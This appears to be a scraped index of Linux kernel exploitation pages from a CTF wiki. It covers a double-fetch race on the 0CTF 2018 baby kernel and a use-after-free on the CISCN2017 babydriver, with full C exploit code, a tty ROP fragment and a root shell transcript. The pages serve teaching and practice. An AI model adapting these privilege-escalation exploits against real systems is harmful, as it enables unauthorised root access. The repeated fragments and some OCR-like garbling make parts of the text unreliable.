( size_t ) get_root ; call [ i ++ ] = 0xffffffff81063694 ; // swapgs; pop rbp; right; call [ i ++ ] = 0 ; call [ i ++ ] = 0xffffffff814e35ef ; // iretq; right; rop [ i ++ ] = ( size_t ) get_shell ; rop [ i ++ ] = user_cs ; /* saved CS */ rop [ i ++ ] = user_rflags ; /* saved EFLAGS */ rop [ i ++ ] = user_sp ; rop [ i ++ ] = user_ss ; for ( int i = 0 ; i < 30 ; i ++ ) { fake_tty_operations [ i ] = 0xFFFFFFFF8181BFC5 ; } fake_tty_operations [ 0 ] = 0xffffffff810635f5 ; //pop rax; pop rbp; ret; fake_tty_operations [ 1 ] = ( size_t ) rop ; fake_tty_operations [ 3 ] = 0xFFFFFFFF8181BFC5 ; // mov rsp,rax ; dec ebx ; ret int fd1 = open ( \"/dev/babydev\" , O_RDWR ); int fd2 = open ( \"/dev/babydev\" , O_RDWR ); ioctl ( fd1 , 0x10001 , 0x2e0 ); close ( fd1 ); int fd_tty = open ( \"/dev/ptmx\" , O_RDWR | O_NOCTTY ); size_t fake_tty_struct [ 4 ] = { 0 }; read ( fd2 , fake_tty_struct , 32 ); fake_tty_struct [ 3 ] = ( size_t ) fake_tty_operations ; write ( fd2 , fake_tty_struct , 32 ); char buf [ 0x8 ] = { 0 }; write ( fd_tty , buf , 8 ); return 0 ; }","title":"0x1407e0 = 101 0 0000 0011 1111 00000"},{"location":"pwn/linux/kernel/double-fetch/","text":"Double Fetch \u00b6 Overview \u00b6 Double Fetch is a conditional competition vulnerability in principle. It is a data access competition between kernel mode and user mode. In modern operating systems such as Linux, virtual memory addresses are usually divided into kernel space and user space. The kernel space is responsible for running kernel code, driver module code, etc., with higher permissions. The user space runs the user code and enters the kernel through system calls to complete the relevant functions. Normally, when user space passes data to the kernel, the kernel first copies the user data to the kernel space through the copy function such as copy_from_user for verification and related processing. However, when the input data is more complicated, the kernel may only refer to its pointer. And temporarily save the data in the user space for subsequent processing. At this time, the data is falsified by other malicious threads, causing the kernel verification data to be inconsistent with the actual usage data, resulting in abnormal execution of the kernel code. A typical Double Fetch vulnerability principle is shown in the following figure. A user-mode thread prepares data and enters the kernel through a system call. The data is fetched twice in the kernel, and the kernel first fetches data for security check ( Such as buffer size, pointer availability, etc., when the check passes, the kernel takes the second data for actual processing. Between the two fetched data, another user-mode thread can create conditional competition, tampering with the user-mode data that has passed the check, causing the access to be out of bounds or buffer overflow during real use, eventually leading to kernel crash or privilege escalation. . [Typical Double Fetch Schematic] (./double-fetch.png) 2018 0CTF Finals Baby Kernel \u00b6 Problem Analysis \u00b6 First, the driver file is analyzed by IDA. It can be seen that the flag is hard coded in the driver file. . data : 00000000000004 80 flag dq offset aFlagThisWillBe . data : 00000000000004 80 ; DATA XREF : baby_ioctl + 2 A \u2191 r . data : 00000000000004 80 ; baby_ioctl + DB \u2191 r ... . data : 00000000000004 80 ; \"flag{THIS_WILL_BE_YOUR_FLAG_1234}\" . data : 00000000000004 88 align 20 h The driver primarily registers a baby_ioctl function with two functions. When the cmd parameter in ioctl is 0x6666, the driver will output the load address of the flag. When the cmd parameter in ioctl is 0x1337, three checksums are first performed, and then the content input by the user is compared with the hard-coded flag byte by byte. When it is consistent, the flag is output by printk . signed __int64 __fastcall baby_ioctl ( __int64 a1 , attr * a2 ) { attr * v2 ; // rdx signed __int64 result ; // rax int i ; // [rsp-5Ch] [rbp-5Ch] attr * v5 ; // [rsp-58h] [rbp-58h] _fentry__ ( a1 , a2 ); v5 = v2 ; if ( ( _DWORD ) a2 == 0x6666 ) { printk ( \"Your flag is at %px! But I don't think you know it's content \\n \" , flag ); result = 0L L ; } else if ( ( _DWORD ) a2 == 0x1337 && ! _chk_range_not_ok (( __int64 ) v2 , 16L L , * ( _QWORD * )( __readgsqword (( unsigned __int64 ) & current_task ) + 4952 )) && ! _chk_range_not_ok ( v5 -> flag_str , SLODWORD ( N 5 & gt ; flag_len ) * ( _QWORD * )( __readgsqword (( unsigned __int64 ) & current_task ) + 4952 )) && LODWORD ( v5 -> flag_len ) == strlen ( flag ) ) { for ( i = 0 ; i < strlen ( flag ); ++ i ) { if ( * ( _BYTE * )( v5 -> flag_str + i ) != flag [ i ] ) return 0x16LL ; } printk ( \"Looks like the flag is not a secret anymore. So here is it %s \\n \" , flag ); result = 0L L ; } else { result = 0xELL ; } return result ; } And analyze its check function, where _chk_range_not_ok is to check if the pointer and length range point to user space. Through the analysis of the function of the driver file, the data structure input by the user can be obtained as follows: 00000000 attr struc ; (sizeof=0x10, mappedto_3) 00000000 flag_str dq? 00000008 flag_len dq? 00000010 attr ends The inspection content is: Whether the input data pointer is user mode data. Whether the flag_str in the data pointer points to the user mode. According to whether the flag_len in the pointer is equal to the length of the hardcoded flag. Problem Solving \u00b6 According to the principle of Double Fetch vulnerability, there is a Double Fetch vulnerability in this problem. When the user input data is verified, the address pointed to by flag_str is changed to the flag hard-coded address, and the flag content is output. First, use the provided cmd=0x6666 function to get the load address of the flag in the kernel. > The contents of the kernel output with printk can be viewed with the dmesg command. Then, construct a data structure that conforms to the cmd=0x1337 function, where flag_len can be obtained directly from hardcoded as 33, and flag_str points to a user space address. Finally, a malicious thread is created, and the user-state address pointed to by flag_str is continually modified to the kernel address of the flag to create a race condition, so that it passes the byte-by-byte comparison check in the driver and outputs the flag content. Exploit \u00b6 // gcc -static exp.c -lpthread -o exp #include <string.h> char * strstr ( const char * haystack , const char * needle ); #define _GNU_SOURCE /* See feature_test_macros(7) */ #include <string.h> char * strcasestr ( const char * haystack , const char * needle ); #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #include <sys/ioctl.h> #include <fcntl.h> #include <pthread.h> #define TRYTIME 0x1000 //Number of collisions #define LEN 0x1000 struct attr { char * flag ; size_t len ; }; unsigned long long addr ; int finish = 0 ; char buf [ LEN + 1 ] = { 0 }; / / Thread function , constantly modify the address pointed to by the flag is the flag address in the kernel void change_attr_value ( void * s ){ struct attr * s1 = s ; while ( finish == 0 ){ s1 -> flag = addr ; } } int main ( void ) { int addr_fd ; char * idx ; int fd = open ( \"/dev/baby\" , 0 ); int ret = ioctl ( fd , 0x6666 ); pthread_t t1 ; struct attr t ; setvbuf ( stdin , 0 , 2 , 0 ); setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stderr , 0 , 2 , 0 ); / / Get the kernel hard - coded flag address system ( \"dmesg > /tmp/record.txt\" ); addr_fd = open ( \"/tmp/record.txt\" , O_RDONLY ); lseek ( addr_fd , - LEN , SEEK_END ); read ( addr_fd , buf , LEN ); close ( addr_fd ); idx = strstr ( buf , \"Your flag is at \" ); if ( idx == 0 ){ printf ( \"[-]Not found addr\" ); exit ( -1 ); } else { idx += 16 ; addr = strtoull ( idx , idx + 16 , 16 ); printf ( \"[+]flag addr: %p \\n \" , addr ); } / / Construct attr data structure t . len = 33 ; t . flag = buf ; / / New malicious thread pthread_create ( & t1 , NULL , change_attr_value , & t ); for ( int i = 0 ; i < TRYTIME ; i ++ ){ ret = ioctl ( fd , 0x1337 , & t ); t . flag = buf ; } finish = 1 ; pthread_join ( t1 , NULL ); close ( fd ); puts ( \"[+]result is :\" ); system ( \"dmesg | grep flag\" ); return 0 ; } Other \u00b6 There are a few points to note when this topic is deployed in the environment. First, you need to turn off dmesg_restrict , otherwise you can't view the printk information. The specific operation is to add in the startup script: echo 0 > /proc/sys/kernel/dmesg_restrict Second, do not enable SMAP protection when configuring QEMU startup parameters, otherwise direct access to user state data in the kernel will cause kerne panic . Also, when configuring the QEMU startup parameters, you need to configure non-single-core single-thread startup, otherwise the race condition in the title cannot be triggered. The specific operation is to increase the number of cores in the startup parameters, such as: -smp 2 , cores = 2 , threads = 1 \\ > After startup, you can check the number of currently running kernels and the number of hyperthreads by /proc/cpuinfo . Finally, there is an unintended solution to a side channel attack on this problem: > Since flag is hard-coded, and the check method is byte-by-byte comparison, it can be blasted byte by byte to get the flag. > The method is to place the byte to be blasted at the end of the memory page of the mmap application, at which point the next byte is in the user-space that is not readable or writable. When the correct one byte is obtained, the kernel compares the correctness of the next byte in the user space. Since the address is unreadable, it will cause kernel panic , so that it can be judged whether one byte of the burst is correct. Reference \u00b6 https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/wang-pengfei https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/ http://p4nda.top/2018/07/20/0ctf-baby/ https://www.freebuf.com/articles/system/156485.html","title":"Double Fetch"},{"location":"pwn/linux/kernel/double-fetch/#double-fetch","text":"","title":"Double Fetch"},{"location":"pwn/linux/kernel/double-fetch/#overview","text":"Double Fetch is a conditional competition vulnerability in principle. It is a data access competition between kernel mode and user mode. In modern operating systems such as Linux, virtual memory addresses are usually divided into kernel space and user space. The kernel space is responsible for running kernel code, driver module code, etc., with higher permissions. The user space runs the user code and enters the kernel through system calls to complete the relevant functions. Normally, when user space passes data to the kernel, the kernel first copies the user data to the kernel space through the copy function such as copy_from_user for verification and related processing. However, when the input data is more complicated, the kernel may only refer to its pointer. And temporarily save the data in the user space for subsequent processing. At this time, the data is falsified by other malicious threads, causing the kernel verification data to be inconsistent with the actual usage data, resulting in abnormal execution of the kernel code. A typical Double Fetch vulnerability principle is shown in the following figure. A user-mode thread prepares data and enters the kernel through a system call. The data is fetched twice in the kernel, and the kernel first fetches data for security check ( Such as buffer size, pointer availability, etc., when the check passes, the kernel takes the second data for actual processing. Between the two fetched data, another user-mode thread can create conditional competition, tampering with the user-mode data that has passed the check, causing the access to be out of bounds or buffer overflow during real use, eventually leading to kernel crash or privilege escalation. . [Typical Double Fetch Schematic] (./double-fetch.png)","title":"Overview"},{"location":"pwn/linux/kernel/double-fetch/#2018-0ctf-finals-baby-kernel","text":"","title":"2018 0CTF Finals Baby Kernel"},{"location":"pwn/linux/kernel/double-fetch/#problem-analysis","text":"First, the driver file is analyzed by IDA. It can be seen that the flag is hard coded in the driver file. . data : 00000000000004 80 flag dq offset aFlagThisWillBe . data : 00000000000004 80 ; DATA XREF : baby_ioctl + 2 A \u2191 r . data : 00000000000004 80 ; baby_ioctl + DB \u2191 r ... . data : 00000000000004 80 ; \"flag{THIS_WILL_BE_YOUR_FLAG_1234}\" . data : 00000000000004 88 align 20 h The driver primarily registers a baby_ioctl function with two functions. When the cmd parameter in ioctl is 0x6666, the driver will output the load address of the flag. When the cmd parameter in ioctl is 0x1337, three checksums are first performed, and then the content input by the user is compared with the hard-coded flag byte by byte. When it is consistent, the flag is output by printk . signed __int64 __fastcall baby_ioctl ( __int64 a1 , attr * a2 ) { attr * v2 ; // rdx signed __int64 result ; // rax int i ; // [rsp-5Ch] [rbp-5Ch] attr * v5 ; // [rsp-58h] [rbp-58h] _fentry__ ( a1 , a2 ); v5 = v2 ; if ( ( _DWORD ) a2 == 0x6666 ) { printk ( \"Your flag is at %px! But I don't think you know it's content \\n \" , flag ); result = 0L L ; } else if ( ( _DWORD ) a2 == 0x1337 && ! _chk_range_not_ok (( __int64 ) v2 , 16L L , * ( _QWORD * )( __readgsqword (( unsigned __int64 ) & current_task ) + 4952 )) && ! _chk_range_not_ok ( v5 -> flag_str , SLODWORD ( N 5 & gt ; flag_len ) * ( _QWORD * )( __readgsqword (( unsigned __int64 ) & current_task ) + 4952 )) && LODWORD ( v5 -> flag_len ) == strlen ( flag ) ) { for ( i = 0 ; i < strlen ( flag ); ++ i ) { if ( * ( _BYTE * )( v5 -> flag_str + i ) != flag [ i ] ) return 0x16LL ; } printk ( \"Looks like the flag is not a secret anymore. So here is it %s \\n \" , flag ); result = 0L L ; } else { result = 0xELL ; } return result ; } And analyze its check function, where _chk_range_not_ok is to check if the pointer and length range point to user space. Through the analysis of the function of the driver file, the data structure input by the user can be obtained as follows: 00000000 attr struc ; (sizeof=0x10, mappedto_3) 00000000 flag_str dq? 00000008 flag_len dq? 00000010 attr ends The inspection content is: Whether the input data pointer is user mode data. Whether the flag_str in the data pointer points to the user mode. According to whether the flag_len in the pointer is equal to the length of the hardcoded flag.","title":"Problem Analysis"},{"location":"pwn/linux/kernel/double-fetch/#problem-solving","text":"According to the principle of Double Fetch vulnerability, there is a Double Fetch vulnerability in this problem. When the user input data is verified, the address pointed to by flag_str is changed to the flag hard-coded address, and the flag content is output. First, use the provided cmd=0x6666 function to get the load address of the flag in the kernel. > The contents of the kernel output with printk can be viewed with the dmesg command. Then, construct a data structure that conforms to the cmd=0x1337 function, where flag_len can be obtained directly from hardcoded as 33, and flag_str points to a user space address. Finally, a malicious thread is created, and the user-state address pointed to by flag_str is continually modified to the kernel address of the flag to create a race condition, so that it passes the byte-by-byte comparison check in the driver and outputs the flag content.","title":"Problem Solving"},{"location":"pwn/linux/kernel/double-fetch/#exploit","text":"// gcc -static exp.c -lpthread -o exp #include <string.h> char * strstr ( const char * haystack , const char * needle ); #define _GNU_SOURCE /* See feature_test_macros(7) */ #include <string.h> char * strcasestr ( const char * haystack , const char * needle ); #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #include <sys/ioctl.h> #include <fcntl.h> #include <pthread.h> #define TRYTIME 0x1000 //Number of collisions #define LEN 0x1000 struct attr { char * flag ; size_t len ; }; unsigned long long addr ; int finish = 0 ; char buf [ LEN + 1 ] = { 0 }; / / Thread function , constantly modify the address pointed to by the flag is the flag address in the kernel void change_attr_value ( void * s ){ struct attr * s1 = s ; while ( finish == 0 ){ s1 -> flag = addr ; } } int main ( void ) { int addr_fd ; char * idx ; int fd = open ( \"/dev/baby\" , 0 ); int ret = ioctl ( fd , 0x6666 ); pthread_t t1 ; struct attr t ; setvbuf ( stdin , 0 , 2 , 0 ); setvbuf ( stdout , 0 , 2 , 0 ); setvbuf ( stderr , 0 , 2 , 0 ); / / Get the kernel hard - coded flag address system ( \"dmesg > /tmp/record.txt\" ); addr_fd = open ( \"/tmp/record.txt\" , O_RDONLY ); lseek ( addr_fd , - LEN , SEEK_END ); read ( addr_fd , buf , LEN ); close ( addr_fd ); idx = strstr ( buf , \"Your flag is at \" ); if ( idx == 0 ){ printf ( \"[-]Not found addr\" ); exit ( -1 ); } else { idx += 16 ; addr = strtoull ( idx , idx + 16 , 16 ); printf ( \"[+]flag addr: %p \\n \" , addr ); } / / Construct attr data structure t . len = 33 ; t . flag = buf ; / / New malicious thread pthread_create ( & t1 , NULL , change_attr_value , & t ); for ( int i = 0 ; i < TRYTIME ; i ++ ){ ret = ioctl ( fd , 0x1337 , & t ); t . flag = buf ; } finish = 1 ; pthread_join ( t1 , NULL ); close ( fd ); puts ( \"[+]result is :\" ); system ( \"dmesg | grep flag\" ); return 0 ; }","title":"Exploit"},{"location":"pwn/linux/kernel/double-fetch/#other","text":"There are a few points to note when this topic is deployed in the environment. First, you need to turn off dmesg_restrict , otherwise you can't view the printk information. The specific operation is to add in the startup script: echo 0 > /proc/sys/kernel/dmesg_restrict Second, do not enable SMAP protection when configuring QEMU startup parameters, otherwise direct access to user state data in the kernel will cause kerne panic . Also, when configuring the QEMU startup parameters, you need to configure non-single-core single-thread startup, otherwise the race condition in the title cannot be triggered. The specific operation is to increase the number of cores in the startup parameters, such as: -smp 2 , cores = 2 , threads = 1 \\ > After startup, you can check the number of currently running kernels and the number of hyperthreads by /proc/cpuinfo . Finally, there is an unintended solution to a side channel attack on this problem: > Since flag is hard-coded, and the check method is byte-by-byte comparison, it can be blasted byte by byte to get the flag. > The method is to place the byte to be blasted at the end of the memory page of the mmap application, at which point the next byte is in the user-space that is not readable or writable. When the correct one byte is obtained, the kernel compares the correctness of the next byte in the user space. Since the address is unreadable, it will cause kernel panic , so that it can be judged whether one byte of the burst is correct.","title":"Other"},{"location":"pwn/linux/kernel/double-fetch/#reference","text":"https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/wang-pengfei https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/ http://p4nda.top/2018/07/20/0ctf-baby/ https://www.freebuf.com/articles/system/156485.html","title":"Reference"},{"location":"pwn/linux/kernel/environment/","text":"\u73af\u5883\u642d\u5efa \u00b6 \u53c2\u89c1 ctf-tools","title":"Environment Setup"},{"location":"pwn/linux/kernel/environment/#_1","text":"\u53c2\u89c1 ctf-tools","title":"\u73af\u5883\u642d\u5efa"},{"location":"pwn/linux/kernel/kernel_uaf/","text":"kernel UAF \u00b6 CISCN2017 - baby driver \u00b6 attachment here Analysis \u00b6 Unzip rootfs.cpio first and see what files are there. CISCN2017_babydriver [ master\u25cf ] mkdir core CISCN2017_babydriver [ master\u25cf ] cd core core [ master\u25cf ] mv ../rootfs.cpio rootfs.cpio.gz core [ master\u25cf\u25cf ] gunzip ./rootfs.cpio.gz core [ master \u25cf ] ls rootfs.cpio core [ master\u25cf ] cpio -idmv < rootfs.cpio . etc etc/init.d etc/passwd etc/group ... ... usr/sbin/rdev usr/sbin/ether-wake tmp linuxrc home home/ctf 5556 blocks core [ master \u25cf ] ls bin etc home init lib linuxrc proc rootfs.cpio sbin sys tmp usr core [ master\u25cf ] bat init \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 File: init \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 1 \u2502 #! / Bin / sh 2 \u2502 3 \u2502 mount -t proc none /proc 4 \u2502 mount -t sysfs none /sys 5 \u2502 mount -t devtmpfs devtmpfs /dev 6 \u2502 chown root:root flag 7 \u2502 chmod 400 flag 8 \u2502 exec 0 </dev/console 9 \u2502 exec 1 >/dev/console 10 \u2502 exec 2 >/dev/console 11 \u2502 12 \u2502 insmod /lib/modules/4.4.72/babydriver.ko 13 \u2502 chmod 777 / dev / babydev 14 \u2502 echo -e \"\\nBoot took $( cut -d ' ' -f1 /proc/uptime ) seconds\\n\" 15 \u2502 setsid cttyhack setuidgid 1000 sh 16 \u2502 17 \u2502 umount /proc 18 \u2502 umount /sys 19 \u2502 poweroff -d 0 -f 20 \u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 According to the content of init, the driver of babydriver.ko is loaded in 12 lines. According to the general routine of pwn, this is the vulnerable LKM. The other commands in init are common commands for linux and will not be explained. Take this driver file out. core [ master\u25cf ] cp ./lib/modules/4.4.72/babydriver.ko .. core [ master \u25cf ] cd .. CISCN2017_babydriver [ master\u25cf ] check ./babydriver.ko ./babydriver.ko: ELF 64 -bit LSB relocatable, x86-64, version 1 ( SYSV ) , BuildID [ sha1 ]= 8ec63f63d3d3b4214950edacf9e65ad76e0e00e7, with debug_info, not stripped [ * ] '/home/m4x/pwn_repo/CISCN2017_babydriver/babydriver.ko' Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled FOOT: No FOOT ( 0x0 ) No PIE, no canary protection, no symbol table removed, very nice. Open the analysis with IDA. Since the symbol table is not removed, shift + F9 first looks at what structure, you can find the following structure: ` asm 00000000 babydevice_t struc ; (sizeof=0x10, align=0x8, copyof_429) 00000000 ; XREF: .bss:babydev_struct/r 00000000 device_buf dq ? ; XREF: babyrelease+6/r 00000000 ; babyopen+26/w ... ; offset 00000008 device_buf_len dq ? ; XREF: babyopen+2D/w 00000008; babyioctl + 3C / w ... 00000010 babydevice_t ends 00000010 Look at the main function **babyioctl:** Defines the 0x10001 command, you can release the device\\_buf in the global variable babydev\\_struct, and then reapply a block of memory according to the size passed by the user, and set device\\_buf\\_len. ```C // local variable allocation has failed, the output may be wrong! void __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg) { size_t v3; // rdx size_t v4; // rbx __int64 v5; // rdx _fentry__(filp, *(_QWORD *)&command); v4 = v3; if ( command == 0x10001 ) { kfree(babydev_struct.device_buf); babydev_struct.device_buf = (char *)_kmalloc(v4, 0x24000C0LL); babydev_struct.device_buf_len = v4; printk(\"alloc done\\n\", 0x24000C0LL, v5); } else { printk(\"\\x013defalut:arg is %ld\\n\", v3, v3); } } babyopen: Apply for a space of 0x40 bytes, the address is stored in the global variable babydev_struct.device_buf, and update babydev_struct.device_buf_len int __fastcall babyopen ( inode * inode , file * filp ) { __int64 v2 ; // rdx _fentry__ ( inode , filp ); babydev_struct . device_buf = ( char * ) kmem_cache_alloc_trace ( kmalloc_caches [ 6 ], 0x24000C0LL , 0x40LL ); babydev_struct . device_buf_len = 64L L ; printk ( \"device open \\n \" , 0x24000C0LL , v2 ); return 0 ; } babyread: First check if the length is less than babydev_struct.device_buf_len, then copy the data in babydev_struct.device_buf to the buffer, the buffer and the length are the parameters passed by the user. void __fastcall babyread ( file * filp , char * buffer , size_t length , loff_t * offset ) { size_t v4 ; // rdx _fentry__ ( filp , buffer ); if ( babydev_struct . device_buf ) { if ( babydev_struct . device_buf_len > v4 ) copy_to_user ( buffer , babydev_struct . device_buf , v4 ); } } babywrite: Similar to babyread, the difference is from the buffer copy to the global variable void __fastcall babywrite ( file * filp , const char * buffer , size_t length , loff_t * offset ) { size_t v4 ; // rdx _fentry__ ( filp , buffer ); if ( babydev_struct . device_buf ) { if ( babydev_struct . device_buf_len > v4 ) copy_from_user ( babydev_struct . device_buf , buffer , v4 ); } } babyrelease: free up space, nothing to say int __fastcall babyrelease ( inode * inode , file * filp ) { __int64 v2 ; // rdx _fentry__ ( inode , filp ); kfree ( babydev_struct . device_buf ); printk ( \"device release \\n \" , filp , v2 ); return 0 ; } There are also two functions, babydriver_init() and babydriver_exit(), which complete the initialization and cleanup of the /dev/babydev device respectively. Check the usage of the function and no longer analyze it. Ideas \u00b6 There are no vulnerabilities such as user-space traditional overflow, but there is a UAF vulnerability caused by pseudo-conditional competition. This means that if we open both devices at the same time, the second time will overwrite the first allocated space, because babydev_struct is global. Similarly, if the first one is released, then the second one is actually released, which results in a UAF. So how do you use UAF? As mentioned before, the cred structure can be modified to grant root to root. The 4.7.22 cred structure [definition] ( https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118 ) is as follows: struct cred { atomic_t usage ; #ifdef CONFIG_DEBUG_CREDENTIALS atomic_t subscribers ; /* number of processes subscribed */ void * put_addr ; unsigned magic ; #define CRED_MAGIC 0x43736564 #define CRED_MAGIC_DEAD 0x44656144 #endif kuid_t uid ; /* real UID of the task */ kgid_t gid ; /* real GID of the task */ kuid_t suid ; /* saved UID of the task */ kgid_t sgid ; /* saved GID of the task */ kuid_t euid ; /* effective UID of the task */ kgid_t egid ; /* effective GID of the task */ but_t fsuid ; / * UID for VFS ops * / kgid_t fsgid ; /* GID for VFS ops */ unsigned securebits ; /* SUID-less security management */ kernel_cap_t cap_inheritable ; /* caps our children can inherit */ kernel_cap_t cap_permitted ; /* caps we're permitted */ kernel_cap_t cap_effective ; /* caps we can actually use */ kernel_cap_t cap_bset ; /* capability bounding set */ kernel_cap_t cap_ambient ; /* Ambient capability set */ #ifdef CONFIG_KEYS unsigned char jit_keyring ; /* default keyring to attach requested * keys to */ struct key __rcu * session_keyring ; /* keyring inherited over fork */ struct key * process_keyring ; /* keyring private to this process */ struct key * thread_keyring ; /* keyring private to this thread */ struct key * request_key_auth ; /* assumed request_key authority */ #endif #ifdef CONFIG_SECURITY void * security ; /* subjective LSM security */ #endif struct user_struct * user ; /* real user ID subscription */ struct user_namespace * user_ns ; /* user_ns the caps and keyrings are relative to. */ struct group_info * group_info ; /* supplementary groups for euid/fsgid */ struct rcu_head rcu ; /* RCU deletion hook */ }; Then according to the UAF's thinking, the idea is as follows: Turn on the device twice and change its size to the size of the cred structure via ioctl Release one, fork a new process, then the space of the cred of this new process will overlap with the previously released space At the same time, we can write to this space through another file descriptor, just need to change uid, gid to 0, that is, you can achieve the right to root Need to determine the size of the cred structure, with the source code, the size is well defined. The calculation is 0xa8 (note the source code using the same kernel version). Exploit \u00b6 The comments are written in the code, exploit here CISCN2017_babydriver [ master \u25cf\u25cf ] cat exploit . c #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <fcntl.h> #include <stropts.h> #include <sys/wait.h> #include <sys/stat.h> int main () { // Open the device twice int fd1 = open ( \"/dev/babydev\" , 2 ); int fd2 = open ( \"/dev/babydev\" , 2 ); // Modify babydev_struct.device_buf_len to sizeof(struct cred) ioctl ( fd1 , 0x10001 , 0xa8 ); // release fd1 close ( fd1 ); // The cred space of the new process will overlap with the babydev_struct just released int pid = fork (); if ( pid < 0 ) { puts ( \"[*] fork error!\" ); exit ( 0 ); } else if ( pid == 0 ) { // Modify the uid of the cred of the new process by changing fd2, the value of gid is 0. char zeros [ 30 ] = { 0 }; write ( fd2 , zeros , 28 ); if ( getuid () == 0 ) { puts ( \"[+] root now.\" ); system ( \"/bin/sh\" ); exit ( 0 ); } } else { wait ( NULL ); } close ( fd2 ); return 0 ; } get root shell \u00b6 // statically compile the file, there is no libc in the kernel CISCN2017_babydriver [ master\u25cf\u25cf ] gcc exploit.c -static -o exploit CISCN2017_babydriver [ master\u25cf\u25cf ] file exploit exploit: ELF 64 -bit LSB executable, x86-64, version 1 ( GNU/Linux ) , statically linked, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= 90aabed5497b6922fda3d5118e4aa9cb2fa5ccc5, not stripped // Repackage rootfs.cpio in the directory where the compiled exp is extracted. CISCN2017_babydriver [ master\u25cf\u25cf ] cp exploit core/tmp CISCN2017_babydriver [ master\u25cf\u25cf ] cd core core [ master\u25cf\u25cf ] find . | cpio -o --format = newc > rootfs.cpio 7017 block core [ master\u25cf\u25cf ] cp rootfs.cpio .. core [ master \u25cf\u25cf ] cd .. // kvm requires root privileges CISCN2017_babydriver [ master\u25cf\u25cf ] sudo ./boot.sh ...... ...... / $ ls / tmp / exploit / $ id uid = 1000 ( ctf ) gid = 1000 ( ctf ) groups = 1000 ( ctf ) / $ /tmp/exploit [ 14 .376187 ] device open [ 14 .376715 ] device open [ 14 .377201 ] alloc done [ 14 .377629 ] device release [ + ] root now. / # id uid = 0 ( root ) gid = 0 ( root ) groups = 1000 ( ctf ) / # Of course, you can also use rop to do the next analysis. Reference: \u00b6 https://bbs.pediy.com/thread-247054.htm https://whereisk0shl.top/NCSTISC%20Linux%20Kernel%20pwn450%20writeup.html http://muhe.live/2017/07/13/babydriver-writeup/ https://www.anquanke.com/post/id/86490","title":"Kernel-UAF"},{"location":"pwn/linux/kernel/kernel_uaf/#kernel-uaf","text":"","title":"kernel UAF"},{"location":"pwn/linux/kernel/kernel_uaf/#ciscn2017-baby-driver","text":"attachment here","title":"CISCN2017 - baby driver"},{"location":"pwn/linux/kernel/kernel_uaf/#analysis","text":"Unzip rootfs.cpio first and see what files are there. CISCN2017_babydriver [ master\u25cf ] mkdir core CISCN2017_babydriver [ master\u25cf ] cd core core [ master\u25cf ] mv ../rootfs.cpio rootfs.cpio.gz core [ master\u25cf\u25cf ] gunzip ./rootfs.cpio.gz core [ master \u25cf ] ls rootfs.cpio core [ master\u25cf ] cpio -idmv < rootfs.cpio . etc etc/init.d etc/passwd etc/group ... ... usr/sbin/rdev usr/sbin/ether-wake tmp linuxrc home home/ctf 5556 blocks core [ master \u25cf ] ls bin etc home init lib linuxrc proc rootfs.cpio sbin sys tmp usr core [ master\u25cf ] bat init \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 \u2502 File: init 